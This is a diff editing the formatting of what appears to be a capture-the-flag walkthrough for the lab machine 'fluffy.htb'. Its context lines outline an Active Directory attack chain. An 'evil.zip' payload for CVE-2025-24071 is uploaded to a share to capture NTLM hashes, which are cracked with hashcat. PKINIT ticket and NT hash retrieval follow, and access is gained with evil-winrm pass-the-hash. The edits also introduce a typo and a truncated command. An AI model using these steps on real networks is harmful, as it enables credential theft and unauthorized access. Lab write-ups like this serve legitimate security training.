@@ -55,7 +55,7 @@ You should find https://github.com/LOOKY243/CVE-2025-24071-PoC
    3. Upload payload to target IT share.
       `put evil.zip`
 
-4. You should se username + hash on listner.
+4. You should ses username + hash on listner.
 
 5. Crack the with rockyou.txt: 
   `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
@@ -95,11 +95,11 @@ If your local time does not match the Domain Controller (DC), you may encounter 
 
 
 ### Generate a TGT using faketime:
-`faketime '<DATE_TIME>' python3 gettgtpkinit.py \
+<pre> ``` aketime '<DATE_TIME>' python3 gettgtpkinit.py \
   -cert-pem key_cert.pem \
   -key-pem key_priv.pem \
   fluffy.htb/<SERVICE_ACCOUNT> \
-  <SERVICE_ACCOUNT>.ccache`
+  <SERVICE_ACCOUNT>.ccache`  ``` </pre>
 
 
 ### Set the Kerberos ticket environment variable:
@@ -110,8 +110,8 @@ If your local time does not match the Domain Controller (DC), you may encounter 
 Tip: Ensure the KRB5CCNAME export works in your virtual environment. Use an absolute path if necessary.
 
 ### Retrieve NT Hash
-'faketime '<DATE_TIME>' python3 getnthash.py \
-  -key <KEY> fluffy.htb/<SERVICE_ACCOUNT>''
+<pre> ```faketime '<DATE_TIME>' python3 getnthash.py \
+  -key <KEY> fluffy.htb/<SERVICE_ACCOUNT> ``` </pre>
 
 ### Access Service Account
 `evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>`
